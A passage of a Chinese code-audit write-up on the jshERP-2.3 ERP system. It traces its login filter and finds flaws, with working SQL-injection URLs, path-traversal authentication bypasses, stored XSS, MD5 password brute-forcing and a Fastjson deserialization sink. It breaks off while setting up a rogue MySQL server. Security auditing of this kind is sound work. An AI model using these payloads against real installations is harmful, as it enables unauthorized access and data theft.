+<figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-comment">//具体，比如：处理若用户未登录，则跳转到登录页</span><br><span class="hljs-built_in">Object</span> userInfo = servletRequest.getSession().getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br>        <span class="hljs-keyword">if</span>(userInfo!=<span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">//如果已登录，不阻止</span><br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>如果访问的url 中包含 <code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>，这些字符串，则不进行认证</p>
+<p><strong>（如果url 长这样呢：<code>/doc.html/../home.html</code>，怕会出现未授权访问）（不严谨！！！）</strong></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>    requestUrl.<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.<span class="hljs-built_in">contains</span>(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>    chain.doFilter(request, response);  <span class="hljs-comment">// 请求以上URL，均不阻止</span><br>    <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>访问<code>.css、.js、.jpg、.png、.gif、.ico、/user/login、/user/registerUser、/v2/api-docs</code>这些内容的时候也不需要认证</p>
+<p><strong>（<code>.css/../home.html</code>，同样存在未授权）（也不严谨！！！）</strong></p>
+<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbscript"><span class="hljs-keyword">if</span> (verify(ignoredList, requestUrl)) &#123;<br>    chain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(servletRequest, <span class="hljs-built_in">response</span>);<br>    return;<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>        <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>            chain.<span class="hljs-keyword">do</span><span class="hljs-built_in">Filter</span>(<span class="hljs-built_in">request</span>, <span class="hljs-built_in">response</span>);<br>            return;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>最后如果用户没有权限，则跳转到登录页</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+</ol>
+<ul>
+<li><p>总结：</p>
+<p>在代码中存在四种判断方式：</p>
+<ul>
+<li>如果已经登录，直接放行</li>
+<li>看URL中是否包含特定路径，包含则放行</li>
+<li>使用<code>verify()</code>方法验证URL，验证通过则放行</li>
+<li>使用以特定字符开头的URL路径则放行</li>
+</ul>
+</li>
+</ul>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><ol>
+<li><p>检查到了Mybatis组件</p>
+<p>所以搜索关键字为：<code>$&#123;</code> ，文件尽量查找跟用户有关的操作，并且查询的是**.xml文件**</p>
+<img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165024557.png" srcset="/img/loading.gif" lazyload style="zoom:25%;" />
+
+<p>jshERP-2.3\src\main\resources\mapper_xml\UnitMapperEx.xml</p>
+</li>
+</ol>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectByConditionUnit&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.jsh.erp.datasource.entities.UnitExample&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;com.jsh.erp.datasource.mappers.UnitMapper.BaseResultMap&quot;</span>&gt;</span><br>        select *<br>        FROM jsh_unit<br>        where 1=1<br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;name != null&quot;</span>&gt;</span><br>            and name like &#x27;%$&#123;name&#125;%&#x27;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>        and ifnull(delete_flag,&#x27;0&#x27;) !=&#x27;1&#x27;<br>        <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;offset != null and rows != null&quot;</span>&gt;</span><br>            limit #&#123;offset&#125;,#&#123;rows&#125;<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li><p>回溯搜索<code>selectByConditionUnit</code>，只有一个接口和一个用法</p>
+<p>jshERP-2.3\src\main\java\com\jsh\erp\service\unit\UnitService.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;Unit&gt; <span class="hljs-title function_">select</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> offset, <span class="hljs-type">int</span> rows)</span><span class="hljs-keyword">throws</span> Exception &#123;<span class="hljs-comment">//用法</span><br>        List&lt;Unit&gt; list=<span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span>&#123;<br>            list=unitMapperEx.selectByConditionUnit(name, offset, rows);<span class="hljs-comment">//接口</span><br>        &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        <span class="hljs-keyword">return</span> list;<br>    &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>寻找参数变量（注意：有些<code>name</code>发生转化，由传递过来的map 控制name 的值）</p>
+<p>先到select</p>
+<p>jshERP-2.3\src\main\java\com\jsh\erp\service\unit\UnitService.java</p>
+<ul>
+<li><p><strong>由传递过来的map 控制name 的值</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getUnitList(Map&lt;String, String&gt; map)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);  <span class="hljs-comment">// Constants.SEARCH 就是search</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;name&quot;</span>);<span class="hljs-comment">// 通过StringUtil.getInfo 获取name值</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>    <span class="hljs-keyword">return</span> unitService.select(name, QueryUtils.offset(map), QueryUtils.rows(map));  <span class="hljs-comment">// QueryUtils.offset(map) 需要我们传入的其他参数有具体的值，且是数字</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此处查看name值获取过程，到<code>getInfo</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);    <span class="hljs-comment">// 解析成json对象（json反序列化）</span><br>        value = obj.getString(key);     <span class="hljs-comment">// 然后从解析的json对象中拿出来name 的属性值</span><br>        <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>            value = <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>就是说，我们传入的search 参数内容应该是一个json 内容</p>
+</li>
+<li><p>到<code>getUnitList</code></p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs livescript">@Override<br>    public List&lt;?&gt; select(<span class="hljs-built_in">Map</span>&lt;<span class="hljs-built_in">String</span>, <span class="hljs-built_in">String</span>&gt; <span class="hljs-keyword">map</span>)throws Exception &#123;<br>        <span class="hljs-keyword">return</span> getUnitList(<span class="hljs-keyword">map</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>再到<code>select</code></p>
+<p>到这里，变成了两个参数控制</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)<span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (StringUtil.isNotEmpty(apiName)) &#123;<br>        <span class="hljs-keyword">return</span> container.getCommonQuery(apiName).select(parameterMap);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;Object&gt;();<br>&#125;<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>这个select 在往上找，就来到了最后的controller 层</p>
+<p>jshERP-2.3\src\main\java\com\jsh\erp\controller\ResourceController.java</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165030075.png" srcset="/img/loading.gif" lazyload alt="image-20250823235517735"></p>
+</li>
+<li><p>查找apiName是什么？？</p>
+<p>寻找apiName从哪里传入，输入get(apiName)查找</p>
+<p>jshERP-2.3\src\main\java\com\jsh\erp\service\CommonQueryManager.java</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165031978.png" srcset="/img/loading.gif" lazyload alt="image-20250824000024856"></p>
+<p>说明：<code>apiName</code>的值会从<code>configComponentMap</code>这个变量中获取，而这个变量在<code>init</code> 函数中被put 压入数据。</p>
+<p>具体的内容是：service下每个文件夹对应一个apiName</p>
+<p>而我们一开始回溯搜索的<code>selectByConditionUnit</code>实现方法就是在<code>service\unit\UnitService.java</code>，所以这里我们需要的apiName 的值就是unit</p>
+<p>而且需要传入参数有三个：<code>pageSize</code>、<code>currentPage</code>、<code>search</code></p>
+</li>
+<li><p>整理:</p>
+<p>两个点：</p>
+<ul>
+<li><p>第一个传入json：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>：<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8080</span>/unit/list?search=/unit/list?search=%<span class="hljs-number">7</span>B%<span class="hljs-number">22</span>name%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>jsh%<span class="hljs-number">27</span>%<span class="hljs-number">20</span>or%<span class="hljs-number">201</span>%<span class="hljs-number">3</span>D1--%<span class="hljs-number">2</span>B%<span class="hljs-number">22</span>%<span class="hljs-number">7</span>D&amp;pageSize=<span class="hljs-number">10</span>&amp;currentPage=<span class="hljs-number">1</span>&amp;pageSize=<span class="hljs-number">10</span>&amp;currentPage=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>第二个点利用apiname——&gt;unit：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload</span>：<br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8080</span>/unit/list?pageSize=&amp;currentPage=&amp;search=jsh&#x27; and sleep(<span class="hljs-number">3</span>)--+<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>应该是先走第一个</p>
+<p>所以payload是传入json的内个</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165034376.png" srcset="/img/loading.gif" lazyload alt="image-20250824002710881"></p>
+<h2 id="权限校验"><a href="#权限校验" class="headerlink" title="权限校验"></a>权限校验</h2><h3 id="包含特定路径可绕过过滤器"><a href="#包含特定路径可绕过过滤器" class="headerlink" title="包含特定路径可绕过过滤器"></a>包含特定路径可绕过过滤器</h3><ol>
+<li><p>当URL中包含<code>/doc.html</code>、<code>/register.html</code>、<code>/login.html</code>则放行数据包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (requestUrl != <span class="hljs-literal">null</span> &amp;&amp; (requestUrl.contains(<span class="hljs-string">&quot;/doc.html&quot;</span>) ||<br>            requestUrl.contains(<span class="hljs-string">&quot;/register.html&quot;</span>) || requestUrl.contains(<span class="hljs-string">&quot;/login.html&quot;</span>))) &#123;<br>            chain.doFilter(request, response);<br>            <span class="hljs-keyword">return</span>;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>构建路径<code>/doc.html/..</code> 再加上正常访问的路径，<code>/doc.html/..</code> 会返回根路径，再加上正常访问路径即可正常访问各功能点</p>
+</li>
+<li><p>正常登录返回两个数据包（先返回一个post，提交之后会返回一个get）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165036442.png" srcset="/img/loading.gif" lazyload alt="image-20250824003549637"></p>
+</li>
+<li><p>删除登录后的Cookie中的session信息的数据包，返回302重定向代码，返回login.html</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165038106.png" srcset="/img/loading.gif" lazyload alt="image-20250824003612455"></p>
+</li>
+<li><p>加入越权Payload后的数据包，获取信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165039947.png" srcset="/img/loading.gif" lazyload alt="image-20250824003654566"></p>
+</li>
+</ol>
+<h3 id="verify-验证可绕过过滤器"><a href="#verify-验证可绕过过滤器" class="headerlink" title="verify()验证可绕过过滤器"></a>verify()验证可绕过过滤器</h3><ol>
+<li><p>一开始定义了要忽略的文件名后缀，包括：<code>.css</code>、<code>.js</code>、<code>.jpg</code>、<code>.png</code>、<code>.gif</code>、<code>.ico</code>文件，之后传递到初始化方法中，生成<code>ignoredList</code>列表</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">        initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">                      @WebInitParam(name = &quot;filterPath&quot;,</span><br><span class="hljs-meta">                              value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>使用<code>verify()</code>方法进行验证，根据代码判断，当访问的文件后缀在<code>ignoredList</code>中，就放行数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165041609.png" srcset="/img/loading.gif" lazyload alt="image-20250823224849701"></p>
+</li>
+<li><p>构建poc</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">/a.css/..`，后面再加上正常访问的路径即可<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>同上直接构建payload越权获取用户信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165043428.png" srcset="/img/loading.gif" lazyload alt="image-20250824003817616"></p>
+</li>
+</ol>
+<h3 id="使用特定路径前缀可绕过过滤器"><a href="#使用特定路径前缀可绕过过滤器" class="headerlink" title="使用特定路径前缀可绕过过滤器"></a>使用特定路径前缀可绕过过滤器</h3><ol>
+<li><p>一开始定义了些允许访问的路径前缀：<code>/user/login</code>、<code>/user/registerUser</code>、<code>/v2/api-docs</code>，初始化方法中把运行访问路径生成<code>alowUrls</code>列表</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(filterName = &quot;LogCostFilter&quot;, urlPatterns = &#123;&quot;/*&quot;&#125;,</span><br><span class="hljs-meta">        initParams = &#123;@WebInitParam(name = &quot;ignoredUrl&quot;, value = &quot;.css#.js#.jpg#.png#.gif#.ico&quot;),</span><br><span class="hljs-meta">                      @WebInitParam(name = &quot;filterPath&quot;,</span><br><span class="hljs-meta">                              value = &quot;/user/login#/user/registerUser#/v2/api-docs&quot;)&#125;)</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>对URL进行判断，若使用的路径开头在<code>allowUrls</code>列表中，则放行数据包</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (<span class="hljs-literal">null</span> != allowUrls &amp;&amp; allowUrls.length &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">for</span> (String url : allowUrls) &#123;<br>                <span class="hljs-keyword">if</span> (requestUrl.startsWith(url)) &#123;<br>                    chain.doFilter(request, response);<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br>        servletResponse.sendRedirect(<span class="hljs-string">&quot;/login.html&quot;</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>判断方法中使用startsWith()方法进行验证，可以使用目录穿越的方式进行绕过，构建Payload路径：<code>/user/login/../..</code> ，后面再添加正常访问路径即可</p>
+</li>
+<li><p>同上直接在数据包搞payload</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165045737.png" srcset="/img/loading.gif" lazyload alt="image-20250824003846664"></p>
+</li>
+</ol>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><ol>
+<li><p>在前端html 目录中搜索有关<code>/add</code> 增加的功能页</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165049113.png" srcset="/img/loading.gif" lazyload alt="image-20250825001033863"></p>
+</li>
+<li><p>有一个增加用户的功能点，先增加一个用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165051098.png" srcset="/img/loading.gif" lazyload alt="image-20250825001210544"></p>
+</li>
+<li><p>然后修改用户名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165052176.png" srcset="/img/loading.gif" lazyload alt="image-20250825001418935"></p>
+</li>
+<li><p>成功弹窗</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165054113.png" srcset="/img/loading.gif" lazyload alt="image-20250825001355332"></p>
+</li>
+<li><p>但有一个前提是拥有登陆后台的高权限</p>
+</li>
+</ol>
+<h2 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h2><ol>
+<li><p>查看user相关代码，发现登录功能没有对登录次数进行限制，也没有验证码验证</p>
+<p>\jshERP-2.3\src\main\java\com\jsh\erp\datasource\entities\User.java</p>
+</li>
+<li><p>这是用户登录的代码jshERP-2.3\src\main\java\com\jsh\erp\controller\UserController.java</p>
+<p>可以进行暴力用户名、密码测试</p>
+</li>
+<li><p>查看登录数据包</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /user/login HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.137.242:8080</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">142</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">142</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: application/json, text/javascript, */*; q=<span class="hljs-number">0</span>.<span class="hljs-number">01</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded; charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">55</span><br><span class="hljs-attribute">Origin</span>: http://<span class="hljs-number">192.168.137.242:8080</span><br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">192.168.137.242:8080</span>/login.html<br><span class="hljs-attribute">Cookie</span>: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="hljs-number">1755958707</span>,<span class="hljs-number">1755966272</span>,<span class="hljs-number">1755966567</span>,<span class="hljs-number">1756050714</span>; JSESSIONID=<span class="hljs-number">3</span>BC51C24F7937AAE005C1EEF190EBC9E; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=<span class="hljs-number">1756053268</span>; HMACCOUNT=BDACAAE04DCF04BE<br><span class="hljs-attribute">Priority</span>: u=<span class="hljs-number">0</span><br><br><span class="hljs-attribute">loginName</span>=jsh&amp;password=e10adc3949ba59abbe56e057f20f883e//这是账号密码<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>可以看到密码加密了（根据密码加密格式可以猜测为md5）（也可以去跑ai）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165150570.png" srcset="/img/loading.gif" lazyload alt="image-20250825003652031"></p>
+</li>
+<li><p>而且在userservice也发现MD5加密的注释</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165059147.png" srcset="/img/loading.gif" lazyload alt="image-20250825003754355"></p>
+</li>
+<li><p>所以可以使用bp的插件，根据字典进行爆破（<strong>记得勾选MD5的加密哈</strong>）</p>
+<p>这里我就偷个小懒，不具体演示了哈</p>
+</li>
+</ol>
+<h2 id="Fastjson反序列化漏洞"><a href="#Fastjson反序列化漏洞" class="headerlink" title="Fastjson反序列化漏洞"></a>Fastjson反序列化漏洞</h2><ol>
+<li><p>扫描<code>pom.xml</code>文件时发现存在1.2.55 版本Fastjson的，上面说过，这个版本是存在反序列化漏洞的版本</p>
+</li>
+<li><p>直接搜索<code>parseObject(</code>关键字 ; 或者换一种思路，直接寻找上面 SQL 注入的一样的<code>search</code></p>
+<p><strong>注意：</strong>这里反序列化的地方很多，我们要去找的地方一定是要输入可控的。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165101586.png" srcset="/img/loading.gif" lazyload alt="image-20250825004159390"></p>
+</li>
+<li><p>定位到<code>StringUtil</code>类文件，其中的静态方法<code>getInfo</code>调用了<code>JSONObject.parseObject()</code>方法，传递的参数是<code>search</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(String search, String key)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(search!=<span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSONObject.parseObject(search);<br>            value = obj.getString(key);<br>            <span class="hljs-keyword">if</span>(value.equals(<span class="hljs-string">&quot;&quot;</span>)) &#123;<br>                value = <span class="hljs-literal">null</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>查看<code>getInfo</code>方法的使用情况，发现之前查看过的<code>PersonComponent</code>类(巧了，就是之前审计的sql的代码)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165103672.png" srcset="/img/loading.gif" lazyload alt="image-20250825004946970"></p>
+</li>
+<li><p>查看<code>PersonComponent</code>类文件，<code>getPersonList()</code>方法调用了<code>StringUtil.getInfo()</code>方法，参数也是search中获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> List&lt;?&gt; getPersonList(Map&lt;String, String&gt; map) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">search</span> <span class="hljs-operator">=</span> map.get(Constants.SEARCH);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;name&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> StringUtil.getInfo(search, <span class="hljs-string">&quot;type&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">order</span> <span class="hljs-operator">=</span> QueryUtils.order(map);<br>        <span class="hljs-keyword">return</span> personService.select(name, type, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>后面就和上面SQL注入时分析的一样，漏洞点路径就应该是<code>/person/list?search=</code></p>
+<p>和之前一样</p>
+<ul>
+<li><p>先搭建在公⽹VPS上搭建FakeMysql服务器</p>
+</li>
